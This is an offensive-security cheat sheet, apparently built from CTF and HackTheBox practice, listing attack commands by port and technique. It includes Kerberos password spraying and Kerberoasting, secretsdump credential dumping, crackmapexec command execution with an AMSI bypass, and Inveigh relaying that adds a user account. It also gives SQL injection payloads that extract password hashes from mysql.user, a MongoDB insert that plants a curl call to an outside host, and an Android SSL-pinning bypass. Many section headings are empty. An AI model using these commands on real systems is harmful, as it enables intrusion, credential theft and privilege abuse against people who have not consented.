# EzpzCheatSheet
This CheatSheet will not have much explanation. It just a commands that has been used pwning all of the machines from various platform and something that I have encounter before.

# A. Ports

### 25 (SMTP)

```bash
# Nmap

# Enum Users
smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 10.10.10.10

# Swaks (Send Email)
swaks --to nik@bank.local --from aniq@bank.local --header "Subject: Welcome" --body "Enjoy your stay!" --server 10.10.10.10
```

### 53 (DNS)

```bash
# Install
sudo apt install dnsutils

# Nmap
nmap -n --script "(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport" 10.10.10.10

# Nslookup
nslookup 10.10.10.10
	* server 10.10.10.10
	* 10.10.10.10

```

### 88 (Kerberos)

```bash
# Nmap


# Enumerate Users
kerbrute userenum -d bank.local --dc 10.10.10.10 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Bruteforce User
kerbrute bruteuser -d bank.local --dc 10.10.10.10 rockyou.txt nik

# Passwword Spray
kerbrute passwordspray -d bank.local --dc 10.10.10.10 user.txt 'Password@123!'

# Kerberoasting
GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt

# bloodhound-python
bloodhound-python -u 'nik' -p 'Password@123!' -d 'bank.locall' -ns 10.10.10.10
```

### 110,995 (POP3)

```bash
# Nmap

# Banner Grabbing
nc -nv 10.10.10.10 110
openssl s_client -connect 10.10.10.10:995 -crlf -quiet

# Connect
telnet 10.10.10.10 110
	* USER nik
	* PASS Password@123!
	* list
	* retr 1
	* quit
```

### 135,593 (RPC)

```bash
# Nmap

# Rpcclient
rpcclient -U '' -N 10.10.10.10

# Rpcclient Commands
- enumdomusers
- netshareenum
- netshareenumall
- srvinfo
- queryuser 500
- querydispinfo
```

### 139,445 (SMB)

```bash
# Nmap
nmap --script "safe or smb-enum-*" -p 445 10.10.10.10
nmap --script smb-vuln\* -p 137,139,445 10.10.10.10

# Smbmap
smbmap -H 10.10.10.10
smbmap -H 10.10.10.10 -u raj -p 123 
smbmap -H 10.10.10.10 -P 139

# Smbclient
smbclient -L 10.10.10.10
smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;mget *"
smbclient -N \\\\10.10.10.10\\Users -c "prompt OFF;recurse ON;ls"
smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;mget *" 'Password@123!'
smbclient -U 'nik' \\\\10.10.10.10\\Data -c "prompt OFF;recurse ON;ls" 'Password@123!'

# Smbget
smbget -R smb://10.10.10.10/users$/nik/nik.xml -U 'nik'

# Crackmapexec
crackmapexec smb --gen-relay-list targets.txt 10.10.10.0/24
crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -X whoami --amsi-bypass /tmp/amsiibypass
crackmapexec smb 10.10.10.10 -u 'nik' -p 'Password@123!' -x whoami 

# Enum4linux
enum4linux 10.10.10.10
```

### 161,162 (SNMP - UDP)

```bash
# Install
pip install snmpclitools

# Snmp-check
snmp-check 10.10.10.10 -c public

# Snmpwalk
snmpwalk -v1 -c public 10.10.10.10
snmpwalk -c public 10.10.10.10
snmpwalk -v1 -c public 10.10.10.10 1
snmpwalk -v1 -c public 10.10.10.10 2
```

### 636 (LDAP)

```bash
# Nmap
nmap -n -sV --script "ldap\* and not brute" 10.10.10.10

# LdapSearch
ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=\*)'
ldapsearch -x -h 10.10.10.10 -D 'bank.local\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'

```

### 2049 (NFS MOUNT)

```bash
# Showmount
showmount -e 10.10.10.10

# Mount
mount -t nfs 10.10.10.10:/home mnt
mount -o vers=3 -t nfs 10.10.10.10:/home mnt
```

### 3128 (SQUID PROXY)

```bash

# Ffuf
ffuf -u 'http://10.10.10.10/FUZZ' -w common.txt:FUZZ -x http://10.10.10.10:3128

# proxychains
echo "http 10.10.10.10 3128" >> /etc/proxychains.conf
	* proxychains ssh john@10.10.10.10
```

### 3306 (MYSQL)

```bash
# Commands
mysql -u root -p -h 10.10.10.10
mysql -u root -pPassword123 -e "use drupal;select * from users"

# Bruteforce
hydra -l nik -p password.txt 10.10.10.10 mysql -t 30 -f

# Check UDF
select * from msql.func;

# Mysql Commands
select sys_exec('whoami');
```

### 3389 (RDP)

```bash
# Nmap
nmap -p 3389 --script=rdp-vuln-* 10.10.10.10

# Commands
xfreerdp /u:nik /p:'Password@123!' /cert:ignore /v:10.10.10.10
xfreerdp /u:admin /p:password /cert:ignore /v:10.10.10.10 /drive:share_mount,/opt/folder_to_mount
```

### 3632 (DISTCC)

```bash
# Nmap
nmap -p 3632 10.10.10.10 --script distcc-exec --script-args="distcc-exec.cmd='id'"

```

### 6379 (REDIS)

```bash
# Install
sudo apt-get install redis-tools

# Commands
redis-cli -h 10.10.10.10
	* keys *
	* get pk:ids:User

```

### 27017,27018 (MONGODB)

```bash
# Commands
mongo localhost:27017/myplace -u nik -p Password123
	* show dbs
	* use <db>
	* show collections
	* db.<collection found>.find()
	* db.<collection found>.insert( { _id: 1, cmd: "curl 10.10.14.4/test"} )
```

# B. Tools/Techniques

### Port Knocking

```bash
# Commands
knocker.py -p 8890,7000,666 10.10.10.10
for i in 571 290 911;do nmap -n -v0 -Pn --max-retries 0 -p $i 10.10.10.10;done
knock 10.10.10.10 7000:666:8890

# Permutation (Port)
python -c 'import itertools; print list(itertools.permutations(\[8890,7000,666\]))' | sed 's/), /\\n/g' | tr -cd '0-9,\\n' | sort | uniq > permutation.txt

```

### SQL Injection

```bash
[MYSQL]
## Get Current Database
database()

## Get Database
UNION SELECT table_schema FROM information_schema.tables

## Get Table Name
UNION SELECT table_name FROM information_schema.tables WHERE table_schema == "database"

## Get Column Name
UNION SELECT table_name, column_name FROM information_schema.columns

###===Time Based===
## Get Database
(SELECT sleep(5) from dual where substring(database(),1,1)='h') 
(SELECT sleep(5) from dual where substring(database(),2,1)='h') 

## Get Tables
(SELECT sleep(5) from information_schema.tables where table_name LIKE '%hotel%')

## Get Columns
(SELECT sleep(5) from information_schema.columns where column_name LIKE '%room%' AND table_name='hotel')

## Extract
IF((select MID(user,1,1) from mysql.user limit 0,1)='D' , sleep(5),0)

## Extra
(select IF(500>1000, "nothing", sleep(5)))

###===Union Based===
## Get Database
9999 union select 1,database(),3,4,5

## Get Tables
9999 union select 1,group_concat(table_name),3,4,5 from information_schema.tables where table_schema like "%hotel%"

## Get Columns
9999 union select 1, group_concat(column_name),3,4,5 from information_schema.columns where table_name like "%room%" 

## Extract
9999 union select 1,group_concat(user,":",password),3,4,5 from mysql.user

```

### Hydra

### Wfuzz

### Ffuf

### Uploading Files

### Local File Inclusion (LFI)

### Remote Command Execution (RCE)

### Socat

### Chisel

### Ping Sweep

### Stegseek

### Binwalk

### Crunch

### PrivescCheck.ps1

### Windows-Exploit-Suggester 

### WebDav

### Threader3000

### Seatbelt.exe

### File Transfer

### Firefox Decrypt

### Sshuttle

### Pwsh

### Invoke-Mimikatz.ps1

### Rubeus

### Covenant

```bash

# Commands
ImpersonateProcess 1776
ImpersonateProcess <PID>

# Rubeus
- Rubeus kerberoast admin hashcat
- Rubeus klist


# Import Powershell
- PowerShellImport 
- Choose file


# Powerview.ps1
- Powershell Get-DomainUser -TrustedToAuth


# Inveigh
- Powershell Invoke-InveighRelay -ConsoleOutput -Y -StatusOutput N -Command "net user commandtest Passw0rd123! /add" -Attack Enumerate,Execute,Session
- Powershell Invoke-Inveigh -ConsoleOutput Y

```

### Impacket Tools

```bash
# GetNPUsers.py
GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/' -no-pass -usersfile user.txt -format hashcat

# GetUserSPNs.py
GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt

# secretsdump.py
secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
```

### Objection

```bash
# Install 
pip3 install -U objection 

# Commands (Step By Step) 
- objection patchapk --source base.apk 
- adb install base.objection.apk 
- objection explore (Make sure to open the application first in our mobile phone before run) 
	* android sslpinning disable 

# References 
- https://gowthamr1.medium.com/android-ssl-pinning-bypass-using-objection-and-frida-scripts-f8199571e7d8 
- https://github.com/sensepost/objection/tree/master/objection/console/helpfiles
```


# C. SUID/CAP/SUDO/GROUP

### LXD

### Node

### Cat

### Snap

### Msfconsole

### Docker

### Initctl

# D. Exploit/CVE/Abuse/Misconf

### ShellShock

### MS-17-010

### MS08-067

### SeImpersonatePrivilege

### MS11-046

### MS16-098

### MS10-059

### Token Kidnapping (Windows 2003)

### DirtySock

### ChrootKit

### IIS 6.0 (CVE-2017-7269)

### AlwaysInstall Elevated

### Ptrace

### FTP Backdoor Command Execution

### Shadow Writable

### OpenSMPTD < 6 (Local Privesc)

### PHP Info + LFI

### DirtyCow

### Ubuntu

```bash
# Kernel 
# < 2.6.37 
- https://www.exploit-db.com/exploits/15704 

# < 3.10
- https://www.exploit-db.com/exploits/18411
	* https://github.com/lucyoa/kernel-exploits/tree/master/memodipper

# < 3.19
- https://www.exploit-db.com/exploits/37292
```

# E. CMS/Web

### Wordpress

### NibbleBlog

### HTTPFileServer

### Drupal

### Elastix

### CMS Made Simple

### Umbraco

### ThinVNC

### Voting System

### Osticket

# F. Reverse Shell

### PowerShell

```powershell
# ConPtyShell (Interactive Powershell)

```

# References
- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://book.hacktricks.xyz/

